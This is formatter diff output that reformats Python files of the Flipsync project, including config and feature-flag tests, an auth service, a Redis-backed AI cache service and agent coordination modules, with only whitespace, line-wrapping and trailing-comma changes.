 token_manager.py - FALLBACK MIGRATION
 
 This file was migrated as part of the Flipsync clean-up project.
 WARNING: This is a fallback migration due to issues with the automated migration.
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/auth/token_manager.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/config/test_config_manager.py	2025-06-14 20:35:30.779715+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/config/test_config_manager.py	2025-06-19 04:03:49.000135+00:00
@@ -18,60 +18,70 @@
         self.config_dir = Path(self.temp_dir.name)
 
         # Create test config files
         self.base_config_path = self.config_dir / "base.yaml"
         with open(self.base_config_path, "w") as f:
-            f.write("""
+            f.write(
+                """
 database:
   host: localhost
   port: 5432
   username: user
   password: password
 
 api:
   host: localhost
   port: 8000
   debug: false
-""")
+"""
+            )
 
         self.dev_config_path = self.config_dir / "development.yaml"
         with open(self.dev_config_path, "w") as f:
-            f.write("""
+            f.write(
+                """
 api:
   debug: true
-""")
+"""
+            )
 
         self.prod_config_path = self.config_dir / "production.yaml"
         with open(self.prod_config_path, "w") as f:
-            f.write("""
+            f.write(
+                """
 database:
   host: db.example.com
   password: prod_password
 
 api:
   debug: false
-""")
+"""
+            )
 
         # Create schema file
         self.schema_path = self.config_dir / "schema.yaml"
         with open(self.schema_path, "w") as f:
-            f.write("""
+            f.write(
+                """
 required:
   - database
   - api
 deprecated:
   - old_setting
-""")
+"""
+            )
 
         # Save original environment
         self.original_env = os.environ.copy()
 
         # Reset the singleton instance to ensure a clean test
         ConfigManager._instance = None
 
         # Create config manager
-        self.config_manager = ConfigManager(config_dir=self.config_dir, environment="development")
+        self.config_manager = ConfigManager(
+            config_dir=self.config_dir, environment="development"
+        )
 
     def tearDown(self):
         """Clean up test environment."""
         # Clean up temporary directory
         self.temp_dir.cleanup()
@@ -82,19 +92,22 @@
 
         # Reset the singleton instance
         ConfigManager._instance = None
         # Also reset the global instance
         import sys
+
         module = sys.modules[ConfigManager.__module__]
         module._config_manager_instance = None
 
     def test_get(self):
         """Test get method."""
         # Test getting values
         self.assertEqual(self.config_manager.get("database.host"), "localhost")
         self.assertEqual(self.config_manager.get("database.port"), 5432)
-        self.assertEqual(self.config_manager.get("api.debug"), True)  # Overridden by development.yaml
+        self.assertEqual(
+            self.config_manager.get("api.debug"), True
+        )  # Overridden by development.yaml
 
         # Test getting non-existent values
         self.assertIsNone(self.config_manager.get("non_existent"))
         self.assertEqual(self.config_manager.get("non_existent", "default"), "default")
 
@@ -104,11 +117,13 @@
         self.config_manager.set("database.host", "new_host")
         self.assertEqual(self.config_manager.get("database.host"), "new_host")
 
         # Test setting nested values
         self.config_manager.set("database.credentials.api_key", "secret")
-        self.assertEqual(self.config_manager.get("database.credentials.api_key"), "secret")
+        self.assertEqual(
+            self.config_manager.get("database.credentials.api_key"), "secret"
+        )
 
     def test_get_section(self):
         """Test get_section method."""
         # Test getting a section
         database_section = self.config_manager.get_section("database")
@@ -135,22 +150,24 @@
 
     def test_reload(self):
         """Test reload method."""
         # Modify a config file
         with open(self.base_config_path, "w") as f:
-            f.write("""
+            f.write(
+                """
 database:
   host: modified_host
   port: 5432
   username: user
   password: password
 
 api:
   host: localhost
   port: 8000
   debug: false
-""")
+"""
+            )
 
         # Explicitly load the base config file to add it to config_paths
         self.config_manager.load(self.base_config_path)
 
         # Reload configuration
@@ -178,14 +195,11 @@
         self.assertEqual(changes[0], ("database.host", "new_host"))
 
     def test_validate(self):
         """Test validate method."""
         # Create a schema
-        schema = {
-            "required": ["database", "api"],
-            "deprecated": ["old_setting"]
-        }
+        schema = {"required": ["database", "api"], "deprecated": ["old_setting"]}
 
         # Test validation with valid configuration
         result = self.config_manager.validate(schema)
         self.assertTrue(result.is_valid)
         self.assertEqual(len(result.errors), 0)
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/config/test_config_manager.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/auth/auth_service.py	2025-06-14 20:35:30.779715+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/auth/auth_service.py	2025-06-19 04:03:49.049898+00:00
@@ -619,11 +619,11 @@
         user = User(
             id=str(user_id),
             email=f"{user_id}@example.com",
             username=str(user_id),
             role=user_role,
-            status=UserStatus.ACTIVE
+            status=UserStatus.ACTIVE,
         )
 
         return user
 
     except HTTPException:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/auth/auth_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/cache/ai_cache.py	2025-06-14 20:35:30.779715+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/cache/ai_cache.py	2025-06-19 04:03:49.063812+00:00
@@ -17,10 +17,11 @@
 from typing import Any, Dict, List, Optional, Union
 
 try:
     import aioredis
     from aioredis import Redis
+
     REDIS_AVAILABLE = True
 except ImportError:
     aioredis = None
     Redis = None
     REDIS_AVAILABLE = False
@@ -28,441 +29,434 @@
 logger = logging.getLogger(__name__)
 
 
 class CacheMetrics:
     """Cache performance metrics tracking."""
-    
+
     def __init__(self):
         self.hits = 0
         self.misses = 0
         self.sets = 0
         self.deletes = 0
         self.errors = 0
         self.total_requests = 0
         self.average_retrieval_time = 0.0
         self.start_time = datetime.now(timezone.utc)
-    
+
     def record_hit(self, retrieval_time: float):
         """Record a cache hit."""
         self.hits += 1
         self.total_requests += 1
         self._update_average_time(retrieval_time)
-    
+
     def record_miss(self):
         """Record a cache miss."""
         self.misses += 1
         self.total_requests += 1
-    
+
     def record_set(self):
         """Record a cache set operation."""
         self.sets += 1
-    
+
     def record_delete(self):
         """Record a cache delete operation."""
         self.deletes += 1
-    
+
     def record_error(self):
         """Record a cache error."""
         self.errors += 1
-    
+
     def _update_average_time(self, retrieval_time: float):
         """Update average retrieval time."""
         if self.hits == 1:
             self.average_retrieval_time = retrieval_time
         else:
             self.average_retrieval_time = (
-                (self.average_retrieval_time * (self.hits - 1) + retrieval_time) / self.hits
-            )
-    
+                self.average_retrieval_time * (self.hits - 1) + retrieval_time
+            ) / self.hits
+
     def get_hit_rate(self) -> float:
         """Get cache hit rate percentage."""
         if self.total_requests == 0:
             return 0.0
         return (self.hits / self.total_requests) * 100
-    
+
     def get_stats(self) -> Dict[str, Any]:
         """Get comprehensive cache statistics."""
         uptime = datetime.now(timezone.utc) - self.start_time
-        
+
         return {
             "hits": self.hits,
             "misses": self.misses,
             "sets": self.sets,
             "deletes": self.deletes,
             "errors": self.errors,
             "total_requests": self.total_requests,
             "hit_rate_percentage": round(self.get_hit_rate(), 2),
             "average_retrieval_time_ms": round(self.average_retrieval_time * 1000, 2),
             "uptime_hours": round(uptime.total_seconds() / 3600, 2),
-            "requests_per_hour": round(self.total_requests / max(uptime.total_seconds() / 3600, 0.01), 2)
+            "requests_per_hour": round(
+                self.total_requests / max(uptime.total_seconds() / 3600, 0.01), 2
+            ),
         }
 
 
 class AICacheService:
     """
     AI analysis caching service using Redis.
-    
+
     This service provides:
     - Hash-based caching for image analysis results
     - TTL-based cache expiration
     - Performance monitoring and metrics
     - Cache invalidation and cleanup
     """
-    
+
     def __init__(self, redis_url: str = "redis://localhost:6379", db: int = 1):
         """Initialize the AI cache service."""
         self.redis_url = redis_url
         self.db = db
         self.redis: Optional[Redis] = None
         self.metrics = CacheMetrics()
-        
+
         # Cache configuration
         self.config = {
             "default_ttl": 3600 * 24,  # 24 hours
             "image_analysis_ttl": 3600 * 24 * 7,  # 7 days
             "category_optimization_ttl": 3600 * 24 * 3,  # 3 days
             "pricing_analysis_ttl": 3600 * 6,  # 6 hours (pricing changes frequently)
             "max_cache_size": 10000,  # Maximum number of cached items
-            "key_prefix": "flipsync:ai:"
+            "key_prefix": "flipsync:ai:",
         }
-        
+
         logger.info("AI Cache Service initialized")
-    
+
     async def connect(self):
         """Connect to Redis."""
         if not REDIS_AVAILABLE:
             logger.warning("Redis not available - caching will be disabled")
             self.redis = None
             return
 
         try:
             self.redis = await aioredis.from_url(
-                self.redis_url,
-                db=self.db,
-                encoding="utf-8",
-                decode_responses=True
+                self.redis_url, db=self.db, encoding="utf-8", decode_responses=True
             )
 
             # Test connection
             await self.redis.ping()
             logger.info("Connected to Redis for AI caching")
 
         except Exception as e:
             logger.error(f"Failed to connect to Redis: {e}")
             self.redis = None
-    
+
     async def disconnect(self):
         """Disconnect from Redis."""
         if self.redis:
             await self.redis.close()
             self.redis = None
             logger.info("Disconnected from Redis")
-    
-    def _generate_cache_key(self, cache_type: str, data: Union[str, bytes, Dict[str, Any]]) -> str:
+
+    def _generate_cache_key(
+        self, cache_type: str, data: Union[str, bytes, Dict[str, Any]]
+    ) -> str:
         """Generate a cache key based on data hash."""
-        
+
         # Convert data to string for hashing
         if isinstance(data, bytes):
             data_str = data.hex()
         elif isinstance(data, dict):
             data_str = json.dumps(data, sort_keys=True)
         else:
             data_str = str(data)
-        
+
         # Create hash
         data_hash = hashlib.sha256(data_str.encode()).hexdigest()[:16]
-        
+
         # Return formatted key
         return f"{self.config['key_prefix']}{cache_type}:{data_hash}"
-    
+
     async def cache_image_analysis(
         self,
         image_data: bytes,
         analysis_result: Dict[str, Any],
         additional_context: str = "",
-        ttl: Optional[int] = None
+        ttl: Optional[int] = None,
     ) -> bool:
         """
         Cache image analysis result.
-        
+
         Args:
             image_data: Original image data for hash generation
             analysis_result: Analysis result to cache
             additional_context: Additional context used in analysis
             ttl: Time to live in seconds (optional)
-            
+
         Returns:
             True if cached successfully, False otherwise
         """
         if not self.redis:
             return False
-        
+
         try:
             # Generate cache key based on image data and context
             cache_data = {
                 "image_hash": hashlib.sha256(image_data).hexdigest(),
-                "context": additional_context
+                "context": additional_context,
             }
             cache_key = self._generate_cache_key("image_analysis", cache_data)
-            
+
             # Prepare cache value
             cache_value = {
                 "analysis_result": analysis_result,
                 "cached_at": datetime.now(timezone.utc).isoformat(),
                 "context": additional_context,
-                "image_size": len(image_data)
-            }
-            
+                "image_size": len(image_data),
+            }
+
             # Set TTL
             cache_ttl = ttl or self.config["image_analysis_ttl"]
-            
+
             # Cache the result
-            await self.redis.setex(
-                cache_key,
-                cache_ttl,
-                json.dumps(cache_value)
-            )
-            
+            await self.redis.setex(cache_key, cache_ttl, json.dumps(cache_value))
+
             self.metrics.record_set()
             logger.debug(f"Cached image analysis result: {cache_key}")
             return True
-            
+
         except Exception as e:
             logger.error(f"Error caching image analysis: {e}")
             self.metrics.record_error()
             return False
-    
+
     async def get_cached_image_analysis(
-        self,
-        image_data: bytes,
-        additional_context: str = ""
+        self, image_data: bytes, additional_context: str = ""
     ) -> Optional[Dict[str, Any]]:
         """
         Retrieve cached image analysis result.
-        
+
         Args:
             image_data: Original image data for hash generation
             additional_context: Additional context used in analysis
-            
+
         Returns:
             Cached analysis result or None if not found
         """
         if not self.redis:
             return None
-        
+
         start_time = time.time()
-        
+
         try:
             # Generate cache key
             cache_data = {
                 "image_hash": hashlib.sha256(image_data).hexdigest(),
-                "context": additional_context
+                "context": additional_context,
             }
             cache_key = self._generate_cache_key("image_analysis", cache_data)
-            
+
             # Retrieve from cache
             cached_value = await self.redis.get(cache_key)
-            
+
             if cached_value:
                 retrieval_time = time.time() - start_time
                 self.metrics.record_hit(retrieval_time)
-                
+
                 # Parse and return cached result
                 cache_data = json.loads(cached_value)
                 logger.debug(f"Cache hit for image analysis: {cache_key}")
                 return cache_data["analysis_result"]
             else:
                 self.metrics.record_miss()
                 logger.debug(f"Cache miss for image analysis: {cache_key}")
                 return None
-                
+
         except Exception as e:
             logger.error(f"Error retrieving cached image analysis: {e}")
             self.metrics.record_error()
             return None
-    
+
     async def cache_category_optimization(
         self,
         product_name: str,
         current_category: str,
         marketplace: str,
         optimization_result: Dict[str, Any],
-        ttl: Optional[int] = None
+        ttl: Optional[int] = None,
     ) -> bool:
         """Cache category optimization result."""
         if not self.redis:
             return False
-        
+
         try:
             # Generate cache key
             cache_data = {
                 "product_name": product_name.lower(),
                 "current_category": current_category.lower(),
-                "marketplace": marketplace.lower()
+                "marketplace": marketplace.lower(),
             }
             cache_key = self._generate_cache_key("category_optimization", cache_data)
-            
+
             # Prepare cache value
             cache_value = {
                 "optimization_result": optimization_result,
                 "cached_at": datetime.now(timezone.utc).isoformat(),
                 "product_name": product_name,
-                "marketplace": marketplace
-            }
-            
+                "marketplace": marketplace,
+            }
+
             # Set TTL
             cache_ttl = ttl or self.config["category_optimization_ttl"]
-            
+
             # Cache the result
-            await self.redis.setex(
-                cache_key,
-                cache_ttl,
-                json.dumps(cache_value)
-            )
-            
+            await self.redis.setex(cache_key, cache_ttl, json.dumps(cache_value))
+
             self.metrics.record_set()
             logger.debug(f"Cached category optimization: {cache_key}")
             return True
-            
+
         except Exception as e:
             logger.error(f"Error caching category optimization: {e}")
             self.metrics.record_error()
             return False
-    
+
     async def get_cached_category_optimization(
-        self,
-        product_name: str,
-        current_category: str,
-        marketplace: str
+        self, product_name: str, current_category: str, marketplace: str
     ) -> Optional[Dict[str, Any]]:
         """Retrieve cached category optimization result."""
         if not self.redis:
             return None
-        
+
         start_time = time.time()
-        
+
         try:
             # Generate cache key
             cache_data = {
                 "product_name": product_name.lower(),
                 "current_category": current_category.lower(),
-                "marketplace": marketplace.lower()
+                "marketplace": marketplace.lower(),
             }
             cache_key = self._generate_cache_key("category_optimization", cache_data)
-            
+
             # Retrieve from cache
             cached_value = await self.redis.get(cache_key)
-            
+
             if cached_value:
                 retrieval_time = time.time() - start_time
                 self.metrics.record_hit(retrieval_time)
-                
+
                 cache_data = json.loads(cached_value)
                 logger.debug(f"Cache hit for category optimization: {cache_key}")
                 return cache_data["optimization_result"]
             else:
                 self.metrics.record_miss()
                 return None
-                
+
         except Exception as e:
             logger.error(f"Error retrieving cached category optimization: {e}")
             self.metrics.record_error()
             return None
-    
+
     async def invalidate_cache(self, pattern: str) -> int:
         """
         Invalidate cache entries matching a pattern.
-        
+
         Args:
             pattern: Redis key pattern to match
-            
+
         Returns:
             Number of keys deleted
         """
         if not self.redis:
             return 0
-        
+
         try:
             # Find matching keys
             keys = await self.redis.keys(f"{self.config['key_prefix']}{pattern}")
-            
+
             if keys:
                 # Delete matching keys
                 deleted_count = await self.redis.delete(*keys)
                 self.metrics.deletes += deleted_count
-                logger.info(f"Invalidated {deleted_count} cache entries matching pattern: {pattern}")
+                logger.info(
+                    f"Invalidated {deleted_count} cache entries matching pattern: {pattern}"
+                )
                 return deleted_count
-            
+
             return 0
-            
+
         except Exception as e:
             logger.error(f"Error invalidating cache: {e}")
             self.metrics.record_error()
             return 0
-    
+
     async def cleanup_expired_cache(self) -> Dict[str, Any]:
         """Clean up expired cache entries and return statistics."""
         if not self.redis:
             return {"error": "Redis not connected"}
-        
+
         try:
             # Get all cache keys
             all_keys = await self.redis.keys(f"{self.config['key_prefix']}*")
-            
+
             expired_count = 0
             total_keys = len(all_keys)
-            
+
             # Check each key for expiration
             for key in all_keys:
                 ttl = await self.redis.ttl(key)
                 if ttl == -2:  # Key doesn't exist (expired)
                     expired_count += 1
-            
+
             # Get memory usage info
             memory_info = await self.redis.info("memory")
-            
+
             return {
                 "total_keys": total_keys,
                 "expired_keys": expired_count,
                 "active_keys": total_keys - expired_count,
                 "memory_used": memory_info.get("used_memory_human", "Unknown"),
-                "cleanup_timestamp": datetime.now(timezone.utc).isoformat()
-            }
-            
+                "cleanup_timestamp": datetime.now(timezone.utc).isoformat(),
+            }
+
         except Exception as e:
             logger.error(f"Error during cache cleanup: {e}")
             return {"error": str(e)}
-    
+
     async def get_cache_statistics(self) -> Dict[str, Any]:
         """Get comprehensive cache statistics."""
         stats = self.metrics.get_stats()
-        
+
         if self.redis:
             try:
                 # Get Redis info
                 redis_info = await self.redis.info()
                 redis_memory = await self.redis.info("memory")
-                
+
                 # Get cache key count
                 cache_keys = await self.redis.keys(f"{self.config['key_prefix']}*")
-                
-                stats.update({
-                    "redis_connected": True,
-                    "redis_version": redis_info.get("redis_version", "Unknown"),
-                    "total_cache_keys": len(cache_keys),
-                    "redis_memory_used": redis_memory.get("used_memory_human", "Unknown"),
-                    "redis_memory_peak": redis_memory.get("used_memory_peak_human", "Unknown")
-                })
-                
+
+                stats.update(
+                    {
+                        "redis_connected": True,
+                        "redis_version": redis_info.get("redis_version", "Unknown"),
+                        "total_cache_keys": len(cache_keys),
+                        "redis_memory_used": redis_memory.get(
+                            "used_memory_human", "Unknown"
+                        ),
+                        "redis_memory_peak": redis_memory.get(
+                            "used_memory_peak_human", "Unknown"
+                        ),
+                    }
+                )
+
             except Exception as e:
-                stats.update({
-                    "redis_connected": False,
-                    "redis_error": str(e)
-                })
+                stats.update({"redis_connected": False, "redis_error": str(e)})
         else:
             stats.update({"redis_connected": False})
-        
+
         return stats
 
 
 # Global cache service instance
 ai_cache_service = AICacheService()
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/cache/ai_cache.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/__init__.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/__init__.py	2025-06-19 04:03:49.129453+00:00
@@ -19,39 +19,64 @@
 """
 
 # Re-export core components
 from fs_agt_clean.core.coordination.event_system import (
     # Event System
-    Event, EventType, EventPriority, EventStatus,
-    CommandEvent, NotificationEvent, QueryEvent, ResponseEvent, ErrorEvent,
-    EventBus, InMemoryEventBus,
-    EventPublisher, EventSubscriber,
-    create_publisher, create_subscriber,
-    get_event_bus, set_event_bus,
-
+    Event,
+    EventType,
+    EventPriority,
+    EventStatus,
+    CommandEvent,
+    NotificationEvent,
+    QueryEvent,
+    ResponseEvent,
+    ErrorEvent,
+    EventBus,
+    InMemoryEventBus,
+    EventPublisher,
+    EventSubscriber,
+    create_publisher,
+    create_subscriber,
+    get_event_bus,
+    set_event_bus,
     # Subscription filters
-    SubscriptionFilter, EventTypeFilter, EventNameFilter,
-    EventSourceFilter, EventTargetFilter, EventPriorityFilter,
-    EventNamePatternFilter, CompositeFilter, CustomFilter
+    SubscriptionFilter,
+    EventTypeFilter,
+    EventNameFilter,
+    EventSourceFilter,
+    EventTargetFilter,
+    EventPriorityFilter,
+    EventNamePatternFilter,
+    CompositeFilter,
+    CustomFilter,
 )
 
 # Coordinator components
 from fs_agt_clean.core.coordination.coordinator import (
     # Agent components
-    AgentInfo, AgentStatus, AgentType, AgentCapability, Coordinator, CoordinationError,
+    AgentInfo,
+    AgentStatus,
+    AgentType,
+    AgentCapability,
+    Coordinator,
+    CoordinationError,
     AgentRegistry,
-
     # Task components
-    Task, TaskStatus, TaskPriority, TaskDelegator,
-
+    Task,
+    TaskStatus,
+    TaskPriority,
+    TaskDelegator,
     # Result components
-    AggregationStrategy, ResultAggregator,
-
+    AggregationStrategy,
+    ResultAggregator,
     # Conflict components
-    Conflict, ConflictType, ConflictStatus, ResolutionStrategy, ConflictResolver,
-
+    Conflict,
+    ConflictType,
+    ConflictStatus,
+    ResolutionStrategy,
+    ConflictResolver,
     # Coordinator implementation
-    InMemoryCoordinator
+    InMemoryCoordinator,
 )
 
 # Knowledge Repository components will be added here
 # Decision Pipeline components will be added here
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/__init__.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/__init__.py	2025-06-19 04:03:49.172216+00:00
@@ -13,22 +13,33 @@
 - Scalable: Capable of handling complex agent ecosystems
 """
 
 # Re-export core components
 from fs_agt_clean.core.coordination.coordinator.coordinator import (
-    AgentInfo, AgentStatus, AgentType, AgentCapability, Coordinator, CoordinationError
+    AgentInfo,
+    AgentStatus,
+    AgentType,
+    AgentCapability,
+    Coordinator,
+    CoordinationError,
 )
-from fs_agt_clean.core.coordination.coordinator.agent_registry import (
-    AgentRegistry
-)
+from fs_agt_clean.core.coordination.coordinator.agent_registry import AgentRegistry
 from fs_agt_clean.core.coordination.coordinator.task_delegator import (
-    Task, TaskStatus, TaskPriority, TaskDelegator
+    Task,
+    TaskStatus,
+    TaskPriority,
+    TaskDelegator,
 )
 from fs_agt_clean.core.coordination.coordinator.result_aggregator import (
-    AggregationStrategy, ResultAggregator
+    AggregationStrategy,
+    ResultAggregator,
 )
 from fs_agt_clean.core.coordination.coordinator.conflict_resolver import (
-    Conflict, ConflictType, ConflictStatus, ResolutionStrategy, ConflictResolver
+    Conflict,
+    ConflictType,
+    ConflictStatus,
+    ResolutionStrategy,
+    ConflictResolver,
 )
 from fs_agt_clean.core.coordination.coordinator.in_memory_coordinator import (
-    InMemoryCoordinator
+    InMemoryCoordinator,
 )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/agent_coordinator.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/agent_coordinator.py	2025-06-19 04:03:49.497190+00:00
@@ -23,224 +23,226 @@
 
 
 class AgentCoordinator:
     """
     Main agent coordinator class for FlipSync.
-    
+
     This class provides a simplified interface for agent coordination,
     wrapping the core coordinator functionality.
     """
-    
+
     def __init__(self, coordinator: Optional[Coordinator] = None):
         """
         Initialize the agent coordinator.
-        
+
         Args:
             coordinator: Optional coordinator instance. If None, uses InMemoryCoordinator.
         """
         self.coordinator = coordinator or InMemoryCoordinator()
         self.logger = logging.getLogger(f"{__name__}.{self.__class__.__name__}")
-        
+
     async def initialize(self) -> None:
         """Initialize the coordinator."""
         try:
-            if hasattr(self.coordinator, 'initialize'):
+            if hasattr(self.coordinator, "initialize"):
                 await self.coordinator.initialize()
             self.logger.info("Agent coordinator initialized successfully")
         except Exception as e:
             self.logger.error(f"Failed to initialize agent coordinator: {e}")
             raise
-    
+
     async def register_agent(
         self,
         agent_id: str,
         agent_type: str,
         name: str,
         description: str = "",
         capabilities: Optional[List[Dict[str, Any]]] = None,
-        metadata: Optional[Dict[str, Any]] = None
+        metadata: Optional[Dict[str, Any]] = None,
     ) -> bool:
         """
         Register an agent with the coordinator.
-        
+
         Args:
             agent_id: Unique identifier for the agent
             agent_type: Type of the agent (executive, specialist, utility, mobile, system)
             name: Human-readable name for the agent
             description: Description of the agent
             capabilities: List of capabilities the agent provides
             metadata: Additional metadata for the agent
-            
+
         Returns:
             True if registration was successful
         """
         try:
             # Convert string agent_type to AgentType enum
             agent_type_enum = AgentType(agent_type.lower())
-            
+
             # Convert capabilities dictionaries to AgentCapability objects
             agent_capabilities = []
             if capabilities:
                 for cap_dict in capabilities:
                     capability = AgentCapability.from_dict(cap_dict)
                     agent_capabilities.append(capability)
-            
+
             # Create AgentInfo object
             agent_info = AgentInfo(
                 agent_id=agent_id,
                 agent_type=agent_type_enum,
                 name=name,
                 description=description,
                 capabilities=agent_capabilities,
                 status=AgentStatus.ACTIVE,
-                metadata=metadata or {}
+                metadata=metadata or {},
             )
-            
+
             # Register with the coordinator
             result = await self.coordinator.register_agent(agent_info)
-            
+
             if result:
                 self.logger.info(f"Successfully registered agent {agent_id} ({name})")
             else:
                 self.logger.warning(f"Failed to register agent {agent_id} ({name})")
-                
+
             return result
-            
+
         except Exception as e:
             self.logger.error(f"Error registering agent {agent_id}: {e}")
             return False
-    
+
     async def unregister_agent(self, agent_id: str) -> bool:
         """
         Unregister an agent from the coordinator.
-        
+
         Args:
             agent_id: ID of the agent to unregister
-            
+
         Returns:
             True if unregistration was successful
         """
         try:
             result = await self.coordinator.unregister_agent(agent_id)
-            
+
             if result:
                 self.logger.info(f"Successfully unregistered agent {agent_id}")
             else:
                 self.logger.warning(f"Failed to unregister agent {agent_id}")
-                
+
             return result
-            
+
         except Exception as e:
             self.logger.error(f"Error unregistering agent {agent_id}: {e}")
             return False
-    
+
     async def get_agent_info(self, agent_id: str) -> Optional[Dict[str, Any]]:
         """
         Get information about an agent.
-        
+
         Args:
             agent_id: ID of the agent
-            
+
         Returns:
             Agent information as a dictionary, or None if not found
         """
         try:
             agent_info = await self.coordinator.get_agent_info(agent_id)
-            
+
             if agent_info:
                 return agent_info.to_dict()
             else:
                 return None
-                
+
         except Exception as e:
             self.logger.error(f"Error getting agent info for {agent_id}: {e}")
             return None
-    
+
     async def get_all_agents(self) -> List[Dict[str, Any]]:
         """
         Get all registered agents.
-        
+
         Returns:
             List of all agents as dictionaries
         """
         try:
             agents = await self.coordinator.get_all_agents()
             return [agent.to_dict() for agent in agents]
-            
+
         except Exception as e:
             self.logger.error(f"Error getting all agents: {e}")
             return []
-    
+
     async def find_agents_by_type(self, agent_type: str) -> List[Dict[str, Any]]:
         """
         Find agents by type.
-        
+
         Args:
             agent_type: Type of agents to find
-            
+
         Returns:
             List of matching agents as dictionaries
         """
         try:
             agent_type_enum = AgentType(agent_type.lower())
             agents = await self.coordinator.find_agents_by_type(agent_type_enum)
             return [agent.to_dict() for agent in agents]
-            
+
         except Exception as e:
             self.logger.error(f"Error finding agents by type {agent_type}: {e}")
             return []
-    
+
     async def update_agent_status(self, agent_id: str, status: str) -> bool:
         """
         Update an agent's status.
-        
+
         Args:
             agent_id: ID of the agent
             status: New status of the agent
-            
+
         Returns:
             True if the update was successful
         """
         try:
             status_enum = AgentStatus(status.lower())
             result = await self.coordinator.update_agent_status(agent_id, status_enum)
-            
+
             if result:
                 self.logger.debug(f"Updated agent {agent_id} status to {status}")
             else:
-                self.logger.warning(f"Failed to update agent {agent_id} status to {status}")
-                
+                self.logger.warning(
+                    f"Failed to update agent {agent_id} status to {status}"
+                )
+
             return result
-            
+
         except Exception as e:
             self.logger.error(f"Error updating agent {agent_id} status: {e}")
             return False
-    
+
     async def check_agent_health(self, agent_id: str) -> bool:
         """
         Check if an agent is healthy.
-        
+
         Args:
             agent_id: ID of the agent
-            
+
         Returns:
             True if the agent is healthy
         """
         try:
             return await self.coordinator.check_agent_health(agent_id)
-            
+
         except Exception as e:
             self.logger.error(f"Error checking agent {agent_id} health: {e}")
             return False
-    
+
     async def shutdown(self) -> None:
         """Shutdown the coordinator."""
         try:
-            if hasattr(self.coordinator, 'shutdown'):
+            if hasattr(self.coordinator, "shutdown"):
                 await self.coordinator.shutdown()
             self.logger.info("Agent coordinator shutdown successfully")
         except Exception as e:
             self.logger.error(f"Error shutting down agent coordinator: {e}")
 
 
 # Export the main class for easy importing
-__all__ = ['AgentCoordinator']
+__all__ = ["AgentCoordinator"]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/agent_coordinator.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/config/test_feature_flags.py	2025-06-14 20:35:30.779715+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/config/test_feature_flags.py	2025-06-19 04:03:49.509998+00:00
@@ -41,10 +41,11 @@
         # Reset the singleton instance
         FeatureFlagManager._instance = None
 
         # Reset the global instance
         import sys
+
         module = sys.modules[FeatureFlagManager.__module__]
         module._feature_flag_manager_instance = None
 
         # Create feature flag manager
         self.feature_flag_manager = FeatureFlagManager(
@@ -63,10 +64,11 @@
         # Reset the singleton instance
         FeatureFlagManager._instance = None
 
         # Reset the global instance
         import sys
+
         module = sys.modules[FeatureFlagManager.__module__]
         module._feature_flag_manager_instance = None
 
     def test_singleton(self):
         """Test that FeatureFlagManager is a singleton."""
@@ -203,11 +205,13 @@
         with open(self.storage_path, "r") as f:
             data = json.load(f)
             self.assertIn("flags", data)
             self.assertIn("test_user_flag", data["flags"])
             self.assertTrue(data["flags"]["test_user_flag"]["enabled"])
-            self.assertEqual(data["flags"]["test_user_flag"]["user_ids"], ["user1", "user2"])
+            self.assertEqual(
+                data["flags"]["test_user_flag"]["user_ids"], ["user1", "user2"]
+            )
 
     def test_add_user_to_flag(self):
         """Test add_user_to_flag method."""
         # Set a user feature flag
         self.feature_flag_manager.set_user_flag(
@@ -246,23 +250,29 @@
         self.feature_flag_manager.set_user_flag(
             "test_user_flag", ["user1", "user2"], True
         )
 
         # Remove a user
-        result = self.feature_flag_manager.remove_user_from_flag("test_user_flag", "user1")
+        result = self.feature_flag_manager.remove_user_from_flag(
+            "test_user_flag", "user1"
+        )
         self.assertTrue(result)
 
         # Verify user was removed
         flag = self.feature_flag_manager.get_flag("test_user_flag")
         self.assertNotIn("user1", flag.user_ids)
 
         # Try to remove a non-existent user
-        result = self.feature_flag_manager.remove_user_from_flag("test_user_flag", "user3")
+        result = self.feature_flag_manager.remove_user_from_flag(
+            "test_user_flag", "user3"
+        )
         self.assertFalse(result)
 
         # Try to remove a user from a non-existent flag
-        result = self.feature_flag_manager.remove_user_from_flag("nonexistent_flag", "user1")
+        result = self.feature_flag_manager.remove_user_from_flag(
+            "nonexistent_flag", "user1"
+        )
         self.assertFalse(result)
 
         # Try to remove a user from a non-user flag
         self.feature_flag_manager.set_enabled("test_flag", True)
         result = self.feature_flag_manager.remove_user_from_flag("test_flag", "user1")
@@ -358,13 +368,11 @@
 
         # Add the listener directly to the list
         self.feature_flag_manager._change_listeners.append(listener)
 
         # Manually call the notify method
-        self.feature_flag_manager._notify_listeners(
-            {}, {"test_flag": True}
-        )
+        self.feature_flag_manager._notify_listeners({}, {"test_flag": True})
 
         # Verify listener was called
         listener.assert_called_once()
 
         # Reset the mock
@@ -380,13 +388,11 @@
 
         # Reset the mock
         listener.reset_mock()
 
         # Test removing a flag
-        self.feature_flag_manager._notify_listeners(
-            {"test_flag": False}, {}
-        )
+        self.feature_flag_manager._notify_listeners({"test_flag": False}, {})
 
         # Verify listener was called
         listener.assert_called_once()
 
         # Remove the listener
@@ -394,31 +400,25 @@
 
         # Reset the mock
         listener.reset_mock()
 
         # Test adding another flag
-        self.feature_flag_manager._notify_listeners(
-            {}, {"another_flag": True}
-        )
